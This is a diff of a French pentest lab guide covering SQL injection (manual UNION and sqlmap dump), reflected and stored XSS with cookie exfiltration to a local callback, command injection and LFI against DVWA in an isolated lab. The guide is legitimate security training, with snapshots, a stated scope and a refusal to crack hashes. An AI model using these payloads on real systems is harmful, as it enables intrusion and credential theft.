 - DVWA accessible : `curl -s -o /dev/null -w '%{http_code}\n' http://192.168.56.103/dvwa/login.php` retourne `200`.
 - Compte `admin` / `password` et niveau `low`. Le script de login ci-dessous crée un cookie jar.
@@ -3191,9 +4685,31 @@ Le Lab-05 a identifié DVWA sur `http://192.168.56.103/dvwa`. Ce lab transforme 
 - Snapshot `avant-exploitation` de Metasploitable 2 ; le guestbook DVWA peut être modifié par le test XSS stocké, d'où la restauration finale.
 - Répertoire de travail Kali : `~/preuves/ch1-lab8-v3`. Répertoire d'archivage hôte : `preuves/ch1-lab8-v3`.
 
-Vérifiez l'état de départ :
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `curl` | `-c`, `-b`, `-d`, `-G`, `--data-urlencode` | Login, cookie jar, SQLi, XSS, commande, LFI |
+| `sqlmap` | `--dbs`, `--tables`, `--dump`, `--answers=crack=N` | Détection et exfiltration SQL |
+| `python3` | `xss-browser-test.py` | Automatisation du navigateur et du callback |
+| Selenium / Chromium / chromedriver | `webdriver.Chrome`, `execute_script`, `get_cookies` | Exécution JavaScript réelle |
+| `prouve` | `prouve 01-login.txt ...` | Preuve horodatée avec code retour |
+| `ss` | `ss -lntp \| grep ':8000'` | Vérification du listener de callback |
+| `scp` / `sha256sum` | Archivage et hachage | Intégrité des preuves |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérifier l'état de départ
+
+**But** — confirmer que DVWA répond, que le port de callback est libre et que les outils sont installés.
+
+**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.
+
+**Prérequis** — snapshot `avant-exploitation` pris ; DVWA démarré.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 source ~/prouve.sh
@@ -3201,9 +4717,32 @@ prouve preuves/ch1-lab8-v3/00-prerequis.txt bash -c \
   'curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.56.103/dvwa/login.php; ss -lntp | grep ":8000" || true; command -v sqlmap; command -v python3; command -v chromium; command -v chromedriver'
 ```
 
-Résultat attendu : `HTTP 200`, aucun listener sur `8000`, et les chemins de `sqlmap`, `python3`, `chromium`, `chromedriver`. Si `8000` est occupé, arrêtez le processus ou changez le port dans `xss-browser-test.py` et dans `CALLBACK`.
+**Explication de la commande**
 
-### 13.4 Scripts complets
+- `source ~/prouve.sh` : charge la fonction `prouve`.
+- `prouve ... 00-prerequis.txt` : enregistre le contrôle et son code retour.
+- `bash -c '...'` : exécute la séquence dans un shell enfant.
+- `curl -s -o /dev/null -w "HTTP %{http_code}\n"` : interroge la page de login sans afficher le corps et imprime le code HTTP.
+- `ss -lntp | grep ":8000"` : vérifie qu'aucun processus n'écoute sur le port de callback.
+- `|| true` : empêche l'absence de listener de faire échouer la preuve.
+- `command -v sqlmap`, `python3`, `chromium`, `chromedriver` : vérifie la présence des outils dans le `PATH`.
+- Piège courant : lancer le test navigateur avec un autre processus sur `8000/tcp` ; le callback échoue ou arrive au mauvais service.
+
+**Résultat attendu**
+
+`HTTP 200`, aucun listener sur `8000`, et les chemins de `sqlmap`, `python3`, `chromium`, `chromedriver`. Si `8000` est occupé, arrêtez le processus ou changez le port dans `xss-browser-test.py` et dans `CALLBACK`.
+
+**Preuve** — `preuves/ch1-lab8-v3/00-prerequis.txt`.
+
+#### Étape 2 — Préparer les scripts
+
+**But** — créer les deux scripts du lab, vérifier leur syntaxe et calculer leurs empreintes avant exécution.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — outils vérifiés à l'étape 1.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
 
 Deux scripts suffisent : `web-tests.sh` pour les tests HTTP/SQLmap, et `xss-browser-test.py` pour l'exécution XSS dans Chromium avec callback.
 
@@ -3393,9 +4932,7 @@ driver.quit()
 server.shutdown()
 ```
 
-**Installation et contrôle** :
-
-> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
+**Exemple de commande**
 
 ```bash
 mkdir -p ~/preuves/ch1-lab8-v3
@@ -3406,29 +4943,81 @@ bash -n web-tests.sh
 sha256sum web-tests.sh xss-browser-test.py | tee SHA256SUMS
 ```
 
-Résultat attendu : aucune erreur de syntaxe, deux empreintes SHA-256. `python3 -m py_compile` crée `__pycache__` ; ce n'est pas une preuve d'exploitation, seulement une vérification de syntaxe.
+**Explication de la commande**
 
-### 13.5 Étape 1 — Login et niveau de sécurité `low`
+- `mkdir -p ~/preuves/ch1-lab8-v3` : crée le répertoire de travail.
+- `cd ~/preuves/ch1-lab8-v3` : place le shell dans ce répertoire.
+- `chmod +x` : rend les deux scripts exécutables.
+- `python3 -m py_compile xss-browser-test.py` : vérifie la syntaxe Python sans exécuter le script.
+- `bash -n web-tests.sh` : vérifie la syntaxe Bash sans exécuter le script.
+- `sha256sum ... | tee SHA256SUMS` : calcule, affiche et enregistre les deux empreintes.
+- `python3 -m py_compile` crée `__pycache__` ; ce n'est pas une preuve d'exploitation, seulement une vérification de syntaxe.
+- Piège courant : modifier un script après le calcul des empreintes ; le hash ne correspond plus.
 
-**But** — obtenir un cookie de session DVWA et forcer le niveau `low`.
+**Explication des scripts**
+
+- `web-tests.sh` commence par `set -u` : toute variable non définie provoque une erreur.
+- `source "$HOME/prouve.sh"` : charge la fonction de preuve.
+- `BASE`, `OUT`, `COOKIE` : fixent l'URL DVWA, le répertoire de sortie et le cookie jar.
+- `mkdir -p "$OUT"` : crée le répertoire des preuves.
+- `01-login` : `curl -D -` affiche les en-têtes, `-c` écrit le cookie jar et `-b` le renvoie ; `grep` extrait `HTTP/`, `Location` et `Set-Cookie`.
+- `02-security-low` : envoie `security=low` et vérifie le cookie `security`.
+- `03-sqli-union` : injecte `UNION SELECT user,password FROM users#` et extrait le bloc `<pre>`.
+- `04-xss-reflected` : envoie `<script>alert(document.cookie)</script>` et vérifie qu'il revient sans échappement.
+- `05-xss-stored-submit` et `06-xss-stored-view` : écrivent le payload dans le guestbook, puis relisent la page.
+- `07-cmdi` : injecte `127.0.0.1; id; hostname; uname -a` dans le formulaire `ping`.
+- `08-lfi` : lit `/etc/passwd` par `page=../../../../../etc/passwd`.
+- `09` à `11` : `PHPSESSID` et `security` sont extraits du cookie jar, puis SQLmap liste les bases, les tables et dumpe cinq comptes avec `--answers=crack=N`.
+- `xss-browser-test.py` démarre un `HTTPServer` sur `0.0.0.0:8000` et journalise chaque requête dans `requests_seen`.
+- `Handler.do_GET` : enregistre le chemin, qui contient le cookie encodé, et retourne `204`.
+- `dismiss_alerts` : accepte les alertes DVWA sans bloquer Chromium.
+- `webdriver.Chrome` avec `--headless=new` : exécute JavaScript dans un navigateur réel sans écran.
+- Le script se connecte, force `security=low`, injecte le XSS réfléchi, remplit le guestbook par `execute_script` pour contourner `maxlength`, puis relit la page stockée.
+- `print("EXFILTRATED_COOKIE:")` : affiche le cookie reçu par le listener.
+- `driver.quit()` et `server.shutdown()` : arrêtent le navigateur et le listener.
+- Piège courant : lancer le script sans `chromedriver` dans le `PATH` ; Chromium ne démarre pas.
+
+**Résultat attendu**
+
+Aucune erreur de syntaxe, deux empreintes SHA-256.
+
+**Preuve** — `preuves/ch1-lab8-v3/web-tests.sh`, `xss-browser-test.py` et `SHA256SUMS`.
+
+#### Étape 3 — Login et niveau de sécurité `low`
+
+**But** — obtenir un cookie de session DVWA, forcer le niveau `low` et enregistrer les deux preuves.
 
 **Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.
 
-**Prérequis** — DVWA accessible, compte `admin`/`password`.
+**Prérequis** — DVWA accessible, compte `admin`/`password`, scripts de l'étape 2.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
-curl -sS -D - -c cookies.txt -b cookies.txt \
-  -d 'username=admin&password=password&Login=Login' \
-  http://192.168.56.103/dvwa/login.php -o /tmp/dvwa-login-v3.html
-curl -sS -b cookies.txt -c cookies.txt \
-  -d 'security=low&seclev_submit=Submit' \
-  http://192.168.56.103/dvwa/security.php -o /tmp/dvwa-security-v3.html
-grep -E 'security[[:space:]]+low' cookies.txt
+prouve 01-login.txt bash -c "curl -sS -D - -c cookies.txt -b cookies.txt -d 'username=admin&password=password&Login=Login' 'http://192.168.56.103/dvwa/login.php' -o /tmp/dvwa-login-v3.html | grep -i -E 'HTTP/|Location|Set-Cookie'; grep -o 'PHPSESSID[^;]*' cookies.txt"
+prouve 02-security-low.txt bash -c "curl -sS -b cookies.txt -c cookies.txt -d 'security=low&seclev_submit=Submit' 'http://192.168.56.103/dvwa/security.php' -o /tmp/dvwa-security-v3.html; grep -E 'security[[:space:]]+low' cookies.txt; grep -o 'Security Level:</b> [a-z]*' /tmp/dvwa-security-v3.html | head -1"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve 01-login.txt` : enregistre le login et son code retour.
+- `curl -sS` : mode silencieux, mais affiche les erreurs.
+- `-D -` : affiche les en-têtes de réponse, dont le `302` et `Location`.
+- `-c cookies.txt` : écrit le cookie jar.
+- `-b cookies.txt` : renvoie le cookie jar.
+- `-d 'username=admin&password=password&Login=Login'` : envoie le formulaire de login en POST.
+- `-o /tmp/dvwa-login-v3.html` : enregistre le corps de la réponse.
+- `grep -i -E 'HTTP/|Location|Set-Cookie'` : extrait les lignes utiles du login.
+- `grep -o 'PHPSESSID[^;]*'` : confirme la présence du cookie de session.
+- `prouve 02-security-low.txt` : enregistre le changement de niveau.
+- `-d 'security=low&seclev_submit=Submit'` : envoie le formulaire `security.php`.
+- `grep -E 'security[[:space:]]+low' cookies.txt` : vérifie que le cookie `security` vaut `low`.
+- `grep -o 'Security Level:</b> [a-z]*' ... | head -1` : vérifie le niveau affiché dans la page.
+- Piège courant : DVWA peut définir `security=high` au login. Si vous ne visitez pas `security.php`, les tests SQLi/XSS échouent ou sont filtrés.
+
+**Résultat attendu**
 
 ```text
 HTTP/1.1 302 Found
@@ -3438,22 +5027,9 @@ PHPSESSID	a6a5b4533db6af4ebd55f1a1ab706804
 # rc=0
 ```
 
-**Explication de la commande** :
+**Preuve** — `01-login.txt` et `02-security-low.txt` avec `# rc=0`.
 
-| Option / étape | Rôle | Pourquoi |
-|---|---|---|
-| `-D -` | affiche les en-têtes | prouve le `302` et la redirection |
-| `-c cookies.txt` | écrit le cookie jar | conserve `PHPSESSID` pour les requêtes suivantes |
-| `-b cookies.txt` | envoie le cookie jar | réutilise la session |
-| `-d 'username=admin&password=password&Login=Login'` | POST de login | formulaire DVWA |
-| `security.php` + `security=low` | change le niveau | active les vulnérabilités volontaires |
-| `grep security low` | vérifie | le cookie `security` vaut `low` |
-
-**Piège courant** — DVWA peut définir `security=high` au login. Si vous ne visitez pas `security.php`, les tests SQLi/XSS échouent ou sont filtrés. Vérifiez toujours le cookie `security` avant de conclure. Ne forcez pas le niveau `low` sans snapshot : le guestbook peut être modifié par le XSS stocké.
-
-**Preuves** — `01-login.txt` et `02-security-low.txt` avec `# rc=0`.
-
-### 13.6 Étape 2 — SQL injection manuelle : UNION SELECT
+#### Étape 4 — SQL injection manuelle : UNION SELECT
 
 **But** — prouver la SQLi avec une requête contrôlée et extraire les comptes de la table `users`.
 
@@ -3463,14 +5039,28 @@ PHPSESSID	a6a5b4533db6af4ebd55f1a1ab706804
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
-curl -sS -b cookies.txt -G \
-  --data-urlencode "id=1' UNION SELECT user,password FROM users#" \
-  --data-urlencode 'Submit=Submit' \
-  'http://192.168.56.103/dvwa/vulnerabilities/sqli/'
+prouve 03-sqli-union.txt bash -c "curl -sS -b cookies.txt -G --data-urlencode \"id=1' UNION SELECT user,password FROM users#\" --data-urlencode 'Submit=Submit' 'http://192.168.56.103/dvwa/vulnerabilities/sqli/' | grep -o '<pre>ID:.*</pre>' | head -5"
 ```
 
-Résultat attendu (extrait réel, blocs `<pre>` séparés pour la lisibilité) :
+**Explication de la commande**
+
+- `prouve 03-sqli-union.txt` : enregistre la requête et son code retour.
+- `curl -sS -b cookies.txt` : interroge DVWA avec la session authentifiée.
+- `-G` : place les données en query string, comme le formulaire DVWA.
+- `--data-urlencode "id=1' UNION SELECT user,password FROM users#"` : encode la charge SQL.
+- `id=1` : valeur normale ; la requête renvoie l'utilisateur 1.
+- `'` : ferme la chaîne SQL et permet d'injecter une clause.
+- `UNION SELECT user,password FROM users` : ajoute les lignes de la table `users` aux deux colonnes de la requête d'origine.
+- `#` : commente la fin de la requête et neutralise la clause restante.
+- `--data-urlencode` : encode `'`, l'espace et `#` ; sans cela, `#` serait interprété comme un fragment d'URL.
+- `grep -o '<pre>ID:.*</pre>'` : extrait les blocs de résultat.
+- `head -5` : limite l'affichage aux cinq premiers blocs.
+- Piège courant : si la page ne renvoie qu'un seul utilisateur, vérifiez que `#` est bien encodé (`%23`) et que le niveau est `low`. Faites d'abord la requête `UNION`, puis SQLmap.
+
+**Résultat attendu**
 
 ```html
 <pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: admin<br>Surname: admin</pre>
@@ -3481,24 +5071,11 @@ Résultat attendu (extrait réel, blocs `<pre>` séparés pour la lisibilité) :
 <pre>ID: 1' UNION SELECT user,password FROM users#<br>First name: smithy<br>Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
 ```
 
-**Explication de la commande** :
-
-| Élément | Rôle | Pourquoi |
-|---|---|---|
-| `id=1` | valeur normale | la requête renvoie l'utilisateur 1 |
-| `'` | ferme la chaîne SQL | permet d'injecter une clause |
-| `UNION SELECT user,password FROM users` | ajoute des lignes | la requête d'origine a deux colonnes (`first_name`, `surname`) |
-| `#` | commente la fin | neutralise la clause `AND` ou `LIMIT` restante |
-| `--data-urlencode` | encode `'`, espace, `#` | évite que `#` soit interprété comme fragment d'URL |
-| `-G` | passe les données en GET | la page DVWA attend `id` et `Submit` en query string |
-
-**Pourquoi le résultat est une exfiltration** — la réponse HTTP contient les noms et les hashes MD5 de la table `users`. Le hash `5f4dcc3b5aa765d61d8327deb882cf99` correspond au mot de passe de lab `password` ; les autres hashes sont visibles. Le lab ne cherche pas à casser les hashes : la lecture est la preuve.
-
-**Piège courant** — si la page ne renvoie qu'un seul utilisateur, vérifiez que `#` est bien encodé (`%23`) et que le niveau est `low`. Si vous utilisez `sqlmap` avant la requête manuelle, vous risquez de confondre une détection automatique avec une compréhension du mécanisme. Faites d'abord la requête `UNION`, puis SQLmap.
+La réponse HTTP contient les noms et les hashes MD5 de la table `users`. Le hash `5f4dcc3b5aa765d61d8327deb882cf99` correspond au mot de passe de lab `password` ; les autres hashes sont visibles. Le lab ne cherche pas à casser les hashes : la lecture est la preuve.
 
 **Preuve** — `03-sqli-union.txt` avec `# rc=0`.
 
-### 13.7 Étape 3 — SQLmap et exfiltration de la base `dvwa`
+#### Étape 5 — SQLmap et exfiltration de la base `dvwa`
 
 **But** — automatiser la découverte, lister les bases et les tables, puis dumper les comptes sans cracking.
 
@@ -3508,29 +5085,50 @@ Résultat attendu (extrait réel, blocs `<pre>` séparés pour la lisibilité) :
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
 PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt)
 SECURITY=$(awk '$6=="security"{print $7}' cookies.txt)
 COOKIE_HEADER="PHPSESSID=$PHPSESSID; security=$SECURITY"
 
-timeout 300 sqlmap \
+prouve 09-sqlmap-dbs.txt timeout 300 sqlmap \
   -u 'http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
   --cookie="$COOKIE_HEADER" --batch --flush-session \
   --output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap" --dbs
 
-timeout 300 sqlmap \
+prouve 10-sqlmap-tables.txt timeout 300 sqlmap \
   -u 'http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
   --cookie="$COOKIE_HEADER" --batch \
   --output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap" -D dvwa --tables
 
-timeout 300 sqlmap \
+prouve 11-sqlmap-dump-users.txt timeout 300 sqlmap \
   -u 'http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
   --cookie="$COOKIE_HEADER" --batch --answers=crack=N \
   --output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap" \
   -D dvwa -T users -C user,password --dump --start 1 --stop 5
 ```
 
-Résultat attendu (extraits réels) :
+**Explication de la commande**
+
+- `PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt)` : extrait la valeur du cookie de session.
+- `SECURITY=$(awk '$6=="security"{print $7}' cookies.txt)` : extrait la valeur du cookie `security`.
+- `COOKIE_HEADER="PHPSESSID=$PHPSESSID; security=$SECURITY"` : reconstruit l'en-tête `Cookie` attendu par DVWA.
+- `prouve 09-sqlmap-dbs.txt` : enregistre la première exécution SQLmap.
+- `timeout 300` : borne chaque exécution à 300 secondes.
+- `-u '...'` : URL cible avec le paramètre `id` injectable.
+- `--cookie="$COOKIE_HEADER"` : réutilise la session DVWA ; sans cookie, la page redirige vers le login.
+- `--batch` : accepte les réponses par défaut, sans interaction.
+- `--flush-session` : repart d'un état propre et évite un cache incohérent.
+- `--output-dir="$HOME/preuves/ch1-lab8-v3/sqlmap"` : conserve les logs et les CSV.
+- `--dbs` : liste les bases et prouve la portée de la lecture.
+- `-D dvwa --tables` : cible la base applicative et liste ses tables.
+- `-D dvwa -T users -C user,password` : limite le dump aux colonnes des comptes.
+- `--dump --start 1 --stop 5` : extrait les lignes 1 à 5, soit les cinq comptes.
+- `--answers=crack=N` : refuse le cracking ; le lab prouve l'exfiltration, pas le cassage.
+- Piège courant : si SQLmap ne détecte rien, vérifiez le cookie `security=low` et l'URL exacte avec `Submit=Submit`. Si SQLmap propose de cracker et que vous répondez `Y`, la preuve devient énorme et le lab sort de son périmètre.
+
+**Résultat attendu**
 
 ```text
 available databases [7]:
@@ -3563,28 +5161,11 @@ Table: users
 +---------+----------------------------------+
 ```
 
-**Explication de la commande** :
+Le dump contient des hashes MD5. Cracker les hashes serait une attaque de force brute ou de dictionnaire, hors périmètre et inutile pour la preuve : la lecture de la table est déjà une exfiltration. Le hash `admin` correspond au mot de passe de lab connu, ce qui illustre la faiblesse du stockage MD5 non salé, mais le lab s'arrête à la démonstration.
 
-| Option | Rôle | Pourquoi |
-|---|---|---|
-| `-u` | URL cible | paramètre `id` injectable |
-| `--cookie` | session DVWA | sans cookie, la page redirige vers le login |
-| `--batch` | réponses par défaut | exécution non interactive |
-| `--flush-session` | repart de zéro | évite un cache de session incohérent |
-| `--output-dir` | archive SQLmap | conserve les logs et le CSV |
-| `--dbs` | liste les bases | prouve la portée de la lecture |
-| `-D dvwa --tables` | liste les tables | cible la base applicative |
-| `-D dvwa -T users -C user,password` | colonnes | limite le dump aux comptes |
-| `--dump --start 1 --stop 5` | lignes 1 à 5 | dump complet des cinq comptes |
-| `--answers=crack=N` | refuse le cracking | le lab prouve l'exfiltration, pas le cassage |
+**Preuve** — `09-sqlmap-dbs.txt`, `10-sqlmap-tables.txt`, `11-sqlmap-dump-users.txt`, avec `# rc=0`.
 
-**Pourquoi ne pas cracker** — le dump contient des hashes MD5. Cracker les hashes serait une attaque de type force brute/dictionnaire, hors périmètre et inutile pour la preuve : la lecture de la table est déjà une exfiltration. Le hash `admin` correspond au mot de passe de lab connu, ce qui illustre la faiblesse du stockage MD5 non salé, mais le lab s'arrête à la démonstration.
-
-**Piège courant** — si SQLmap ne détecte rien, vérifiez le cookie `security=low` et l'URL exacte avec `Submit=Submit`. Si SQLmap propose de cracker et que vous répondez `Y`, la preuve devient énorme et le lab sort de son périmètre ; utilisez `--answers=crack=N`.
-
-**Preuves** — `09-sqlmap-dbs.txt`, `10-sqlmap-tables.txt`, `11-sqlmap-dump-users.txt`, avec `# rc=0`.
-
-### 13.8 Étape 4 — XSS réfléchi
+#### Étape 6 — XSS réfléchi
 
 **But** — prouver qu'un paramètre est renvoyé sans encodage et qu'un script peut s'exécuter dans le navigateur.
 
@@ -3594,35 +5175,36 @@ Table: users
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
-curl -sS -b cookies.txt -G \
-  --data-urlencode 'name=<script>alert(document.cookie)</script>' \
-  'http://192.168.56.103/dvwa/vulnerabilities/xss_r/'
+prouve 04-xss-reflected.txt bash -c "curl -sS -b cookies.txt -G --data-urlencode 'name=<script>alert(document.cookie)</script>' 'http://192.168.56.103/dvwa/vulnerabilities/xss_r/' | grep -o '<script>alert(document.cookie)</script>' | head -1"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve 04-xss-reflected.txt` : enregistre la requête et son code retour.
+- `curl -sS -b cookies.txt` : interroge DVWA avec la session authentifiée.
+- `-G` : place le paramètre en query string, comme le formulaire.
+- `--data-urlencode 'name=...'` : encode le payload pour ne pas casser l'URL.
+- `name=` : paramètre réfléchi ; DVWA réaffiche la valeur dans la page.
+- `<script>` : balise interprétée comme du JavaScript par le navigateur.
+- `alert(document.cookie)` : lit le cookie de session et démontre l'accès.
+- `grep -o '<script>alert(document.cookie)</script>'` : vérifie que le payload revient sans échappement.
+- `head -1` : limite l'affichage à une occurrence.
+- Piège courant : si la réponse contient `&lt;script&gt;`, le niveau n'est pas `low` ou un filtre est actif. Ne concluez pas « XSS » sur une simple présence de texte : vérifiez que `<` et `>` sont bruts.
+
+**Résultat attendu**
 
 ```html
 <script>alert(document.cookie)</script>
 ```
 
-**Explication de la commande** :
-
-| Élément | Rôle | Pourquoi |
-|---|---|---|
-| `name=` | paramètre réfléchi | DVWA réaffiche la valeur dans la page |
-| `<script>` | balise exécutable | le navigateur l'interprète comme du JavaScript |
-| `alert(document.cookie)` | lecture du cookie | démontre l'accès au cookie de session |
-| `--data-urlencode` | encode le payload | évite de casser l'URL |
-| `-G` | GET | le paramètre est attendu en query string |
-
-**Ce que la preuve `curl` montre et ne montre pas** — elle montre que le serveur renvoie le payload **sans échappement**. Elle ne prouve pas à elle seule l'exécution, car `curl` n'exécute pas JavaScript. L'étape 13.12 exécute le même type de payload dans Chromium et prouve l'exécution par un callback contenant le cookie.
-
-**Piège courant** — si la réponse contient `&lt;script&gt;`, le niveau n'est pas `low` ou un filtre est actif. Ne concluez pas « XSS » sur une simple présence de texte : vérifiez que les caractères `<` et `>` sont bruts.
+La preuve `curl` montre que le serveur renvoie le payload **sans échappement**. Elle ne prouve pas à elle seule l'exécution, car `curl` n'exécute pas JavaScript. L'étape 10 de ce lab exécute le même type de payload dans Chromium et prouve l'exécution par un callback contenant le cookie.
 
 **Preuve** — `04-xss-reflected.txt` avec `# rc=0`.
 
-### 13.9 Étape 5 — XSS stocké
+#### Étape 7 — XSS stocké
 
 **But** — prouver qu'un payload est stocké dans le guestbook et réexécuté à chaque visite.
 
@@ -3632,38 +5214,37 @@ Résultat attendu (extrait réel) :
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
-```bash
-curl -sS -b cookies.txt \
-  --data-urlencode "txtName=<script>alert(1)</script>" \
-  --data-urlencode 'mtxMessage=stored-xss-proof' \
-  --data-urlencode 'btnSign=Sign Guestbook' \
-  'http://192.168.56.103/dvwa/vulnerabilities/xss_s/'
+**Exemple de commande**
 
-curl -sS -b cookies.txt 'http://192.168.56.103/dvwa/vulnerabilities/xss_s/'
+```bash
+prouve 05-xss-stored-submit.txt bash -c "curl -sS -b cookies.txt --data-urlencode \"txtName=<script>alert(1)</script>\" --data-urlencode 'mtxMessage=stored-xss-proof' --data-urlencode 'btnSign=Sign Guestbook' 'http://192.168.56.103/dvwa/vulnerabilities/xss_s/' | grep -o '<script>alert(1)</script>' | head -1"
+prouve 06-xss-stored-view.txt bash -c "curl -sS -b cookies.txt 'http://192.168.56.103/dvwa/vulnerabilities/xss_s/' | grep -o '<script>alert(1)</script>' | head -1"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve 05-xss-stored-submit.txt` : enregistre la soumission du guestbook.
+- `curl -sS -b cookies.txt` : utilise la session authentifiée.
+- `--data-urlencode "txtName=<script>alert(1)</script>"` : écrit le payload dans le nom du visiteur.
+- `mtxMessage=stored-xss-proof` : ajoute un message lisible pour retrouver l'entrée.
+- `btnSign=Sign Guestbook` : déclenche l'insertion.
+- `grep -o '<script>alert(1)</script>'` : vérifie que le payload est présent dans la réponse.
+- `prouve 06-xss-stored-view.txt` : enregistre la relecture de la page.
+- Le second `curl` relit la page sans renvoyer le formulaire : il prouve la persistance, pas seulement la réflexion.
+- `head -1` : limite l'affichage à une occurrence.
+- Piège courant : le champ `txtName` a un `maxlength="10"` et `mtxMessage` un `maxlength="50"`. Le test `curl` contourne le contrôle client ; le test navigateur de l'étape 10 utilise `execute_script` pour illustrer le même bypass.
+
+**Résultat attendu**
 
 ```html
 <script>alert(1)</script>
 ```
 
-**Explication de la commande** :
+Le payload n'est pas seulement dans l'URL : il est enregistré et exécuté pour chaque visiteur de la page. Un attaquant n'a pas besoin de convaincre la victime de cliquer sur un lien spécial : la page légitime exécute le script.
 
-| Élément | Rôle | Pourquoi |
-|---|---|---|
-| `txtName` | nom du visiteur | affiché dans le guestbook |
-| `mtxMessage` | message | également affiché sans encodage |
-| `btnSign` | soumission | déclenche l'insertion |
-| second `curl` | relecture | prouve la persistance, pas seulement la réflexion |
+**Preuve** — `05-xss-stored-submit.txt` et `06-xss-stored-view.txt` avec `# rc=0`.
 
-**Pourquoi le XSS stocké est plus grave** — le payload n'est pas seulement dans l'URL : il est enregistré et exécuté pour chaque visiteur de la page. Un attaquant n'a pas besoin de convaincre la victime de cliquer sur un lien spécial : la page légitime exécute le script.
-
-**Piège courant** — le champ `txtName` a un `maxlength="10"` et `mtxMessage` un `maxlength="50"`. Le test `curl` contourne le contrôle client ; le test navigateur de 13.12 utilise `execute_script` pour illustrer le même bypass. Le serveur doit valider et encoder, pas seulement le navigateur.
-
-**Preuves** — `05-xss-stored-submit.txt` et `06-xss-stored-view.txt` avec `# rc=0`.
-
-### 13.10 Étape 6 — Injection de commande
+#### Étape 8 — Injection de commande
 
 **But** — prouver qu'un paramètre est passé à un shell et exécuter des commandes avec l'utilisateur du serveur web.
 
@@ -3673,14 +5254,28 @@ Résultat attendu (extrait réel) :
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab8-v3`
 
+**Exemple de commande**
+
 ```bash
-curl -sS -b cookies.txt \
-  --data-urlencode 'ip=127.0.0.1; id; hostname; uname -a' \
-  --data-urlencode 'submit=submit' \
-  'http://192.168.56.103/dvwa/vulnerabilities/exec/'
+prouve 07-cmdi.txt bash -c "curl -sS -b cookies.txt --data-urlencode 'ip=127.0.0.1; id; hostname; uname -a' --data-urlencode 'submit=submit' 'http://192.168.56.103/dvwa/vulnerabilities/exec/' | sed -n '/<pre>/,/<\/pre>/p' | head -20"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve 07-cmdi.txt` : enregistre la requête et son code retour.
+- `curl -sS -b cookies.txt` : utilise la session authentifiée.
+- `--data-urlencode 'ip=127.0.0.1; id; hostname; uname -a'` : envoie une valeur valide suivie de commandes.
+- `ip=127.0.0.1` : valeur valide qui passe le contrôle de format.
+- `;` : sépare les commandes et permet d'exécuter la suite.
+- `id` : prouve l'utilisateur `www-data`.
+- `hostname` : prouve l'exécution locale.
+- `uname -a` : complète la preuve par la version du noyau.
+- `submit=submit` : déclenche le formulaire.
+- `sed -n '/<pre>/,/<\/pre>/p'` : extrait le bloc de sortie du formulaire.
+- `head -20` : limite l'affichage à vingt lignes.
+- Piège courant : si le formulaire échappe `;`, essayez `|` ou `&&` uniquement si le niveau est `low` et si le lab l'autorise. Ne lancez pas de commande destructive (`rm`, `shutdown`, modification de fichier) : la preuve est `id`, `hostname`, `uname`.
+
+**Résultat attendu**
 
 ```text
 64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.010 ms
@@ -3689,24 +5284,11 @@ metasploitable
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 ```
 
-**Explication de la commande** :
-
-| Élément | Rôle | Pourquoi |
-|---|---|---|
-| `ip=127.0.0.1` | valeur valide | passe le contrôle de format |
-| `;` | séparateur de commandes | exécute la commande suivante |
-| `id` | identité | prouve l'utilisateur `www-data` |
-| `hostname` | nom d'hôte | prouve l'exécution locale |
-| `uname -a` | noyau | complète la preuve |
-| `submit=submit` | soumission | déclenche le formulaire |
-
-**Pourquoi `www-data` et pas root** — Apache/PHP tourne sous `www-data`. L'injection de commande donne les droits du processus web, pas ceux de root. Une élévation locale serait une autre étape, hors périmètre.
-
